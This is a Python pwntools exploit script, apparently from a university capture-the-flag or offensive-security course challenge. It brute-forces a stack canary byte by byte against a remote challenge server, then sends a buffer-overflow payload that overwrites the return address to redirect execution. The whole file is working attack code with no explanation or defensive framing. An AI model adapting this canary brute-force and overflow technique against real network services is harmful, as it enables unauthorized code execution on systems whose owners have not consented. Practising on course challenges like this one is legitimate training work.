from pwn import *

context.log_level ='debug'
passstring = 'goodbye'
# p = process('./new_brutus') #although you can start this here, it throws an error. better start it manually ina diff terminal
payload = 'A'*136 + '\x00'

#for brute forcing the last byte of the canary
# lst = [0x78, 0x47, 0xe2, 0xe4, 0x32, 0xba]
# payload = 'A'*136 + '\x00' + \
# p8(lst[0]) + p8(lst[1]) + p8(lst[2]) + \
# p8(lst[3]) + p8(lst[4]) + p8(lst[5])

lst = []

for j in range (0,7):
	for i in range(0,256):
		# r = remote('127.0.0.1', 8000) #local process but connecting over socket
		r = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1340)
		r.sendafter('abc123): ', 'tg1799\n')
		payloadcp = payload
		payloadcp += p8(i)
		r.sendafter('name?\n', '200\n')
		r.sendafter('data\n', payloadcp)
		rr = r.recv()
		print(p8(i))
		if passstring in rr:
			lst.append(i)
			print(lst)
			payload += p8(i)
			print(payload)
			break
print(payload)

final_payload = 'A'*136 + '\x00' + p8(lst[0]) + p8(lst[1]) + p8(lst[2]) +\ 
p8(lst[3]) + p8(lst[4]) + p8(lst[5]) + p8(lst[6]) + 'B'*8 + p64(0x00401276) + '\n'

r = remote('127.0.0.1', 8000) #local process but connecting over socket
r.sendafter('name?\n', '200\n')
r.sendafter('data\n', final_payload)

#payload = 'A'*136 + '\x00'
#canary = 00 78 47 e2 